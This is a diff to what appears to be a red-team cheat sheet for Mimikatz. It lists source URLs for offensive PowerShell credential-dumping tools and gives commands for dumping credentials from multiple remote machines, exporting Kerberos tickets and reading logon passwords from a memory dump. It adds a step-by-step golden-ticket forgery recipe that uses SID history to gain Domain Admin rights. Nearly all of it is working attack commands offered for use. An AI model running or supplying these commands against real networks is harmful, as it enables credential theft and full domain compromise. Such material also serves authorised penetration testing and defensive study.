@@ -1,7 +1,7 @@
 # source 
 https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SafetyKatz.ps1
 https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-BetterSafetyKatz.ps1
-https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
+https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1
 
 # dump credentials from multiple machines
 Invoke-Mimikatz -DumpCreds -ComputerName @("<computerName>", "<computerName>")
@@ -16,4 +16,14 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 mimikatz.exe
 mimi> sekurlsa::minidump <file>.dmp
 mimi> sekurlsa::logonPasswords full
+
+# golden ticket
+# get sid of attacker user
+whoami /user
+
+# get sid of target Domain Admins group
+PS> ([adsisearcher]"(&(objectClass=group)(samaccountname=<>))").FindAll().Properties
+
+# create kerberos ticket
+kerberos::golden /user:<attackerUser> /domain:<attackerDomain> /sid:<attackerSid> /sids:<targetDomainAdminGroupSid> /ticket:"<pathToKerberosTicket>.kirbi"
 
